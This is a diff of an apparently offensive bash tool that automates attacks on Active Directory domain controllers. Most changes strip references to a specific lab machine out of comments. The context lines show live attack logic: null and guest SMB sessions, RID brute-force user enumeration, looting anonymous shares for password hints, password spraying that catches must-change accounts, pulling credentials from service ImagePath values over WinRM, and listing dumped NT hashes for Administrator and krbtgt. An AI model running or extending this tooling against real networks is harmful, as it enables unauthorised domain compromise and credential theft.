@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.43.1"
+readonly VERSION="1.43.2"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -576,8 +576,8 @@ phase_discovery() {
             DOMAIN="$parsed_dom"; ok "Domain detected: ${C_BOLD}$DOMAIN${C_RESET}"
         elif [[ "${DOMAIN,,}" != "${parsed_dom,,}" ]]; then
             # The DC's advertised domain IS the authoritative Kerberos realm. A mismatch
-            # means the -d / guessed value is wrong (e.g. sendai.htb vs the real
-            # sendai.vl) → KDC_ERR_WRONG_REALM on every getTGT, so the whole pivot dies
+            # means the -d / guessed value is wrong (a guessed realm vs the DC's real
+            # one) → KDC_ERR_WRONG_REALM on every getTGT, so the whole pivot dies
             # before must-change resets can fire. Trust the DC over what we were told,
             # and rebuild the FQDN/realm from it.
             warn "Supplied domain '${DOMAIN}' ≠ DC-advertised '${parsed_dom}' → using the DC's realm (authoritative)"
@@ -715,7 +715,7 @@ phase_unauth() {
     run "$NXC smb $DC_IP -u '' -p ''";    $NXC smb "$DC_IP" -u '' -p '' 2>&1 | tee -a "$LOGFILE"
     run "$NXC smb $DC_IP -u guest -p ''"; local _gt; _gt=$($NXC smb "$DC_IP" -u 'guest' -p '' 2>&1); echo "$_gt" | tee -a "$LOGFILE"
     # If guest is enabled, prefer it as the anonymous credential everywhere below — it
-    # out-enumerates the null session on hardened DCs (the Sendai case).
+    # out-enumerates the null session on hardened DCs.
     if grep -qiE '\[\+\][^[]*\\guest:' <<<"$_gt"; then
         GUEST_ENABLED=1
         loot "Guest account is ENABLED → trying guest alongside null for anonymous enumeration"
@@ -743,12 +743,12 @@ phase_unauth() {
     # that when RID-brute succeeds we already hold every user and the share looting
     # below is just for the password HINT, not a desperate hunt for usernames.
     subsection "RID brute force (enumerate users without credentials)"
-    # A plain NULL session (-u '' -p '') is commonly DENIED on hardened DCs (Sendai
-    # returns LSAD STATUS_ACCESS_DENIED), but a GUEST session still allows SAMR RID
+    # A plain NULL session (-u '' -p '') is commonly DENIED on hardened DCs (they
+    # return an LSAD STATUS_ACCESS_DENIED), but a GUEST session still allows SAMR RID
     # cycling — ANY junk username with a blank password is mapped to Guest when guest
     # access is enabled. Try null first, then guest/junk, and keep whichever returns
-    # users. (This is the exact reason `nxc -u test -p '' --rid-brute` works on Sendai
-    # while `-u ''` does not.)
+    # users. (This is the exact reason `nxc -u test -p '' --rid-brute` works on such
+    # DCs while `-u ''` does not.)
     local rb="" _pair _ru _rp _ridok=""
     for _pair in "_NULL_ _NULL_" "guest _NULL_" "adautopwn _NULL_"; do
         _ru="${_pair%% *}"; _rp="${_pair##* }"
@@ -776,7 +776,7 @@ phase_unauth() {
 
     # DOWNLOAD + harvest anonymously-readable shares. Listing isn't enough — the
     # weak-password hint that gives the foothold lives INSIDE these files (e.g.
-    # Sendai's incident.txt). nxc's null spider is tried first; if it pulls nothing
+    # a breach-notice .txt). nxc's null spider is tried first; if it pulls nothing
     # (or nxc --shares misses a share that smbclient/smbmap can see) we fall back to
     # smbclient recursive download per readable non-default share.
     subsection "Anonymous share looting — download readable files + harvest creds"
@@ -1106,7 +1106,7 @@ phase_validate_creds() {
     if echo "$out" | grep -qi '\[+\].*(Guest)'; then
         # nxc tags a login that was DOWNGRADED to the Guest account with "(Guest)". When
         # guest is enabled, ANY username + blank password "succeeds" as Guest — this is
-        # NOT a real credential for $USER (e.g. junk mined from text like safety.company).
+        # NOT a real credential for $USER (e.g. a junk username mined from share text).
         warn "'${USER}' only authenticated AS GUEST (blank-password downgrade, not a real credential) → skipping"
         note_cred_source "$USER" "guest-downgrade (not a real account)"
         return
@@ -2653,8 +2653,8 @@ _winrm_exec() {
 # flags, and the local privesc surface (AlwaysInstallElevated, non-system32 SYSTEM
 # services, SYSTEM scheduled tasks, top-level dirs). Findings feed the engine.
 # Service binaries very often embed credentials directly in their ImagePath command
-# line (e.g. `C:\Windows\helpdesk.exe -u clifford.davey -p <pw>`) — a classic lateral
-# move on a DC with no obvious AD path (this is exactly the Sendai foothold). Read the
+# line (e.g. `C:\Windows\svc.exe -u <user> -p <pw>`) — a classic lateral
+# move on a DC with no obvious AD path. Read the
 # registry ImagePath of EVERY service (svchost-excluded: those are arg-less DLL hosts),
 # surface the ones carrying credential-like args, and feed them to harvest_secrets so
 # the embedded account is extracted, queued and pivoted AUTOMATICALLY. Run as its OWN
@@ -4417,7 +4417,7 @@ _seed_anon_weak_spray() {
             # nxc tags a login that was DOWNGRADED to the Guest account with "(Guest)".
             # When guest is enabled, ANY username + blank password "succeeds" as Guest —
             # that's NOT a real credential for the named user (e.g. junk like
-            # safety.company mined from text). Skip those; keep only true blank-password
+            # a junk username mined from share text). Skip those; keep only true blank-password
             # accounts (a plain [+] with no (Guest)) and must-change ones.
             grep -qi '(Guest)' <<<"$line" && continue
             u=$(grep -oP '\\\K[^\\:]+(?=:)' <<<"$line" | head -1); [[ -z "$u" ]] && continue
@@ -4454,8 +4454,8 @@ _spray_one() {
             u=$(echo "$line" | grep -oP '\\\K[^\\:]+(?=:)' | head -1)
             [[ -z "$u" ]] && continue
             # STATUS_PASSWORD_MUST_CHANGE = the password is CORRECT but the account
-            # must change it at next logon (the classic anonymous-foothold trick on
-            # boxes like Sendai). Queue it with this password — the assessment's
+            # must change it at next logon (a classic anonymous-foothold trick).
+            # Queue it with this password — the assessment's
             # getTGT will hit KEY_EXPIRED and _change_expired_password resets it.
             if grep -qi 'STATUS_PASSWORD_MUST_CHANGE' <<<"$line"; then
                 loot "★ Valid (MUST-CHANGE) credential → ${C_GREEN}${u} : ${pw}${C_RESET} — will reset on pivot"
@@ -5934,8 +5934,9 @@ final_summary() {
             # high-value first (Administrator, krbtgt), then the rest
             while IFS= read -r line; do
                 local u nt lc ud; u=$(echo "$line" | cut -d: -f1); nt=$(echo "$line" | cut -d: -f4); lc="${u,,}"
-                # detail() runs echo -e, which eats backslash escapes (sendai.vl\Elliot
-                # → \E = ESC → "sendai.vlliot"). Double the backslashes for display.
+                # detail() runs echo -e, which eats backslash escapes in a DOMAIN\user
+                # string (a name beginning \E, \t, \n … gets mangled). Double the
+                # backslashes so domain\user always prints literally.
                 ud="${u//\\/\\\\}"
                 case "$lc" in
                     *administrator|*krbtgt|*'$') detail "      ${C_RED}${C_BOLD}${ud}${C_RESET} ${C_DIM}:${C_RESET} ${C_RED}${nt}${C_RESET}" ;;
